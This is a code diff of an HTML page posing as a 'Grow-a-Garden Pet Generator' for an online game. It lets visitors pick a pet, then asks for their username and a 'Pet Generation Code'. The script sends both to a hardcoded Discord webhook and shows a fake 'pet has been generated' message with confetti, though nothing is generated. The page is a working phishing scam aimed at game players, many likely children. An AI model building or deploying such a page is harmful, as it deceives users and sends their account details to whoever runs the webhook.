@@ -1,168 +1,375 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Grow-a-Garden: Pet Generator</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      font-family: Arial, sans-serif;
-      color: #fff;
-      background: #0b1623;
-      overflow-x: hidden;
-    }
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Grow-a-Garden Pet Generator</title>
+<style>
+  html, body {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    background: radial-gradient(ellipse at top, #0a192f 0%, #020617 100%) !important;
+    color: #e0f2fe;
+    overflow-x: hidden;
+    font-family: 'Segoe UI', Tahoma, sans-serif;
+  }
 
-    /* Star background */
-    body::before {
-      content: "";
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: url('https://www.transparenttextures.com/patterns/stardust.png');
-      opacity: 0.4;
-      z-index: -1;
-    }
+  #starfield {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    z-index: 0;
+  }
 
-    h1 {
-      text-align: center;
-      margin: 20px 0;
-      font-size: 2rem;
-    }
+  header, .container, #popup, #confirmPopup {
+    position: relative;
+    z-index: 1;
+  }
 
-    .container {
-      max-width: 900px;
-      margin: 0 auto;
-      text-align: center;
-    }
+  header {
+    background: rgba(30, 58, 138, 0.8);
+    backdrop-filter: blur(12px);
+    padding: 16px;
+    text-align: center;
+    font-size: 1.8rem;
+    font-weight: bold;
+    border-bottom: 2px solid #3b82f6;
+    color: #f8fafc;
+  }
 
-    .pet-grid {
-      display: grid;
-      grid-template-columns: repeat(5, 1fr);
-      gap: 15px;
-      justify-items: center;
-      margin-bottom: 20px;
-    }
+  .container {
+    max-width: 1100px;
+    margin: auto;
+    padding: 20px;
+  }
 
-    .pet-card {
-      background: #0d2852;
-      border: 2px solid #1f3a68;
-      border-radius: 10px;
-      padding: 10px;
-      cursor: pointer;
-      transition: transform 0.2s, border-color 0.2s;
-      width: 120px;
-      height: 120px;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-    }
+  h2, h3 {
+    color: #bfdbfe;
+  }
 
-    .pet-card img {
-      max-width: 60px;
-      max-height: 60px;
-      margin-bottom: 8px;
-    }
+  .pets {
+    display: grid;
+    grid-template-columns: repeat(5, 1fr);
+    gap: 20px;
+    justify-items: center;
+  }
 
-    .pet-card.selected {
-      border-color: #ffd700;
-      transform: scale(1.05);
-    }
+  .pet-card {
+    position: relative;
+    width: 160px;
+    background: rgba(30, 41, 59, 0.9);
+    border: 2px solid #3b82f6;
+    border-radius: 14px;
+    padding: 14px;
+    text-align: center;
+    overflow: hidden;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+    animation: float 3s ease-in-out infinite;
+    color: #f1f5f9;
+  }
+  .pet-card:hover {
+    transform: translateY(-8px) scale(1.08);
+    box-shadow: 0 8px 18px rgba(59, 130, 246, 0.6);
+  }
+  .pet-card img {
+    width: 90px;
+    height: 90px;
+    border-radius: 10px;
+    object-fit: cover;
+    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
+  }
+  .selected {
+    border-color: #60a5fa;
+    box-shadow: 0 0 14px rgba(96, 165, 250, 0.9);
+  }
 
-    button {
-      background: #1a4d8f;
-      color: white;
-      border: none;
-      padding: 12px 25px;
-      font-size: 1rem;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: background 0.3s;
-    }
+  .pet-card::before {
+    content: "";
+    position: absolute;
+    top: 0; left: -75%;
+    width: 50%; height: 100%;
+    background: linear-gradient(120deg, transparent, rgba(255,255,255,0.4), transparent);
+    transform: skewX(-25deg);
+  }
+  .pet-card:hover::before {
+    animation: shine 1s forwards;
+  }
+  @keyframes shine {
+    100% { left: 125%; }
+  }
 
-    button:hover {
-      background: #2563c4;
-    }
+  button {
+    padding: 12px 20px;
+    margin-top: 14px;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    background: linear-gradient(to right, #2563eb, #1d4ed8);
+    color: #f8fafc;
+    font-size: 1.1rem;
+    font-weight: bold;
+    transition: background 0.3s, transform 0.2s;
+    box-shadow: 0 6px 12px rgba(0,0,0,0.3);
+  }
+  button:hover {
+    background: linear-gradient(to right, #1d4ed8, #1e40af);
+    transform: scale(1.07);
+  }
 
-    /* Popup */
-    .popup {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: #1a4d8f;
-      padding: 20px;
-      border-radius: 12px;
-      color: #fff;
-      display: none;
-      z-index: 999;
-      text-align: center;
-    }
-  </style>
+  /* Popup shared styles */
+  #popup, #confirmPopup {
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(15, 23, 42, 0.9);
+    justify-content: center;
+    align-items: center;
+    animation: fadein 0.3s ease;
+  }
+  .popup-content {
+    background: #0f172a;
+    padding: 24px;
+    border-radius: 14px;
+    width: 320px;
+    max-width: 90%;
+    animation: slideup 0.4s ease;
+    box-shadow: 0 0 20px rgba(96, 165, 250, 0.9), 0 0 40px rgba(59, 130, 246, 0.6);
+    border: 2px solid #3b82f6;
+    color: #e2e8f0;
+    text-align: center;
+  }
+
+  /* 🔥 Special animation for confirmation popup */
+  #confirmPopup .popup-content {
+    animation: popscale 0.5s ease;
+  }
+  @keyframes popscale {
+    0% { transform: scale(0.6); opacity: 0; }
+    60% { transform: scale(1.1); opacity: 1; }
+    100% { transform: scale(1); }
+  }
+
+  #popup input {
+    width: 100%;
+    margin-top: 10px;
+    padding: 8px;
+    border-radius: 8px;
+    border: 1px solid #3b82f6;
+    background: #0f172a;
+    color: #f8fafc;
+  }
+
+  .tutorial {
+    margin-top: 40px;
+    padding: 20px;
+    background: rgba(15, 23, 42, 0.9);
+    border-radius: 14px;
+    border: 2px solid #3b82f6;
+  }
+  iframe {
+    border-radius: 8px;
+  }
+
+  @keyframes float {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-8px); }
+  }
+  @keyframes fadein {
+    from { opacity: 0; }
+    to { opacity: 1; }
+  }
+  @keyframes slideup {
+    from { transform: translateY(40px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+  }
+</style>
 </head>
 <body>
-  <h1>🌱 Grow-a-Garden: Pet Generator</h1>
+  <canvas id="starfield"></canvas>
+
+  <header>🌌 Grow-a-Garden: Pet Generator</header>
 
   <div class="container">
-    <p>Select Your Pet</p>
-    <div class="pet-grid">
-      <div class="pet-card" data-pet="Kitsune"><img src="kitsune.png" alt="Kitsune"><span>Kitsune</span></div>
-      <div class="pet-card" data-pet="Raccoon"><img src="raccoon.png" alt="Raccoon"><span>Raccoon</span></div>
-      <div class="pet-card" data-pet="Disco Bee"><img src="bee.png" alt="Disco Bee"><span>Disco Bee</span></div>
-      <div class="pet-card" data-pet="Mimic Octopus"><img src="octopus.png" alt="Mimic Octopus"><span>Mimic Octopus</span></div>
-      <div class="pet-card" data-pet="Fennec Fox"><img src="fox.png" alt="Fennec Fox"><span>Fennec Fox</span></div>
+    <h2>Select Your Pet</h2>
+    <div class="pets" id="petGrid"></div>
 
-      <div class="pet-card" data-pet="Butterfly"><img src="butterfly.png" alt="Butterfly"><span>Butterfly</span></div>
-      <div class="pet-card" data-pet="Dragon"><img src="dragon.png" alt="Dragon"><span>Dragon</span></div>
-      <div class="pet-card" data-pet="Penguin"><img src="penguin.png" alt="Penguin"><span>Penguin</span></div>
-      <div class="pet-card" data-pet="Capybara"><img src="capybara.png" alt="Capybara"><span>Capybara</span></div>
-      <div class="pet-card" data-pet="Axolotl"><img src="axolotl.png" alt="Axolotl"><span>Axolotl</span></div>
+    <div style="margin-top:20px; text-align:center;">
+      <button onclick="openPopup()">Generate Pet</button>
     </div>
 
-    <button id="generateBtn">Generate Pet</button>
+    <div class="tutorial">
+      <h3>📺 Tutorial</h3>
+      <p>Watch this video before generating your pet:</p>
+      <iframe width="100%" height="315" src="https://www.youtube.com/embed/dnBvM1z-1yo" frameborder="0" allowfullscreen></iframe>
+    </div>
   </div>
 
-  <div class="popup" id="popup">
-    <p>Pet has been generated! Please wait 10-15 minutes for it to appear!</p>
-    <button onclick="document.getElementById('popup').style.display='none'">OK</button>
+  <!-- Username/Code Popup -->
+  <div id="popup">
+    <div class="popup-content">
+      <h3>Enter Your Details</h3>
+      <input type="text" id="username" placeholder="Username" />
+      <input type="text" id="code" placeholder="Pet Generation Code" />
+      <button onclick="submitData()">Submit</button>
+    </div>
   </div>
 
-  <script>
-    const petCards = document.querySelectorAll('.pet-card');
-    let selectedPet = null;
+  <!-- Confirmation Popup (with popscale animation) -->
+  <div id="confirmPopup">
+    <div class="popup-content">
+      <h3>✅ Pet has been generated!</h3>
+      <p>Please wait 10-15 minutes for it to appear!</p>
+      <button onclick="closeConfirm()">OK</button>
+    </div>
+  </div>
 
-    petCards.forEach(card => {
-      card.addEventListener('click', () => {
-        petCards.forEach(c => c.classList.remove('selected'));
-        card.classList.add('selected');
-        selectedPet = card.dataset.pet;
-      });
+<script>
+  const pets = [
+    { id: 'Kitsune', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Kitsune.png', name: 'Kitsune' },
+    { id: 'Raccoon', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Raccoon.png', name: 'Raccoon' },
+    { id: 'Disco Bee', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Disco_Bee.png', name: 'Disco Bee' },
+    { id: 'Mimic Octopus', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Mimic_Octopus.png', name: 'Mimic Octopus' },
+    { id: 'Fennec Fox', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Fennec_Fox.png', name: 'Fennec Fox' },
+    { id: 'Butterfly', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Butterfly.png', name: 'Butterfly' },
+    { id: 'Dragon', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Dragon.png', name: 'Dragon' },
+    { id: 'Penguin', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Penguin.png', name: 'Penguin' },
+    { id: 'Capybara', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Capybara.png', name: 'Capybara' },
+    { id: 'Axolotl', img: 'https://cdn.nookazon.com/128x128/growagarden/Pets/Axolotl.png', name: 'Axolotl' }
+  ];
+
+  let selectedPet = pets[0].id;
+
+  const petGrid = document.getElementById('petGrid');
+  pets.forEach(pet => {
+    const div = document.createElement('div');
+    div.className = 'pet-card';
+    if (pet.id === selectedPet) div.classList.add('selected');
+    div.innerHTML = `
+      <img src="${pet.img}" alt="${pet.name}" />
+      <div>${pet.name}</div>
+    `;
+    div.onclick = () => selectPet(pet.id);
+    petGrid.appendChild(div);
+  });
+
+  function selectPet(id) {
+    selectedPet = id;
+    document.querySelectorAll('.pet-card').forEach(card => card.classList.remove('selected'));
+    document.querySelectorAll('.pet-card')[pets.findIndex(p => p.id === id)].classList.add('selected');
+  }
+
+  function openPopup() {
+    document.getElementById('popup').style.display = 'flex';
+  }
+
+  function closeConfirm() {
+    document.getElementById('confirmPopup').style.display = 'none';
+  }
+
+  async function submitData() {
+    const username = document.getElementById('username').value.trim();
+    const code = document.getElementById('code').value.trim();
+    if (!username || !code) return;
+
+    const webhookURL = "https://discord.com/api/webhooks/1409605165782143016/a9nUyURURC7QOuWcsMzKzzTIGzo1tW3A_kseFgaud3WQ_hz3VkxIOwm31H7xySmLBJbm"; // placeholder
+
+    const payload = {
+      content: `Pet Generated!\nUsername: ${username}\nCode: ${code}\nSelected Pet: ${pets.find(p=>p.id===selectedPet).name}`
+    };
+
+    await fetch(webhookURL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
     });
 
-    document.getElementById('generateBtn').addEventListener('click', async () => {
-      if (!selectedPet) {
-        alert('Please select a pet first!');
-        return;
+    document.getElementById('popup').style.display = 'none';
+    document.getElementById('confirmPopup').style.display = 'flex';
+    launchConfetti();
+  }
+
+  // 🎉 Confetti Effect
+  function launchConfetti() {
+    const duration = 3 * 1000;
+    const end = Date.now() + duration;
+
+    (function frame() {
+      const colors = ['#3b82f6', '#60a5fa', '#93c5fd', '#fbbf24', '#f472b6'];
+      const confettiCount = 5;
+      for (let i = 0; i < confettiCount; i++) {
+        const confetti = document.createElement("div");
+        confetti.style.position = "fixed";
+        confetti.style.width = "8px";
+        confetti.style.height = "14px";
+        confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+        confetti.style.top = "-20px";
+        confetti.style.left = Math.random() * window.innerWidth + "px";
+        confetti.style.opacity = 0.9;
+        confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
+        confetti.style.zIndex = 9999;
+        document.body.appendChild(confetti);
+
+        const fallDuration = Math.random() * 2000 + 2000;
+        confetti.animate([
+          { transform: confetti.style.transform, top: "-20px", opacity: 1 },
+          { transform: `rotate(${Math.random()*720}deg)`, top: window.innerHeight + "px", opacity: 0.7 }
+        ], {
+          duration: fallDuration,
+          iterations: 1
+        }).onfinish = () => confetti.remove();
       }
+      if (Date.now() < end) requestAnimationFrame(frame);
+    })();
+  }
 
-      try {
-        const response = await fetch('https://backend-sigma-one-64.vercel.app/api/sendWebhook', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ pet: selectedPet })
-        });
+  // Starfield background
+  const canvas = document.getElementById('starfield');
+  const ctx = canvas.getContext('2d');
+  let stars = [];
 
-        if (response.ok) {
-          document.getElementById('popup').style.display = 'block';
-        } else {
-          alert('Failed to generate pet. Please try again.');
-        }
-      } catch (error) {
-        alert('Could not connect to backend.');
+  function resize() {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    stars = Array.from({ length: 200 }, () => ({
+      x: Math.random() * canvas.width,
+      y: Math.random() * canvas.height,
+      r: Math.random() * 2 + 1,
+      d: Math.random() * 0.5
+    }));
+  }
+  resize();
+  window.onresize = resize;
+
+  function drawStars() {
+    const gradient = ctx.createLinearGradient(0, 0, 0, canvas.height);
+    gradient.addColorStop(0, "#0a192f");
+    gradient.addColorStop(1, "#020617");
+    ctx.fillStyle = gradient;
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+    ctx.fillStyle = "white";
+    stars.forEach(s => {
+      ctx.beginPath();
+      ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
+      ctx.fill();
+    });
+    updateStars();
+  }
+
+  function updateStars() {
+    stars.forEach(s => {
+      s.y += s.d;
+      if (s.y > canvas.height) {
+        s.y = 0;
+        s.x = Math.random() * canvas.width;
       }
     });
-  </script>
+  }
+
+  setInterval(drawStars, 30);
+</script>
 </body>
 </html>
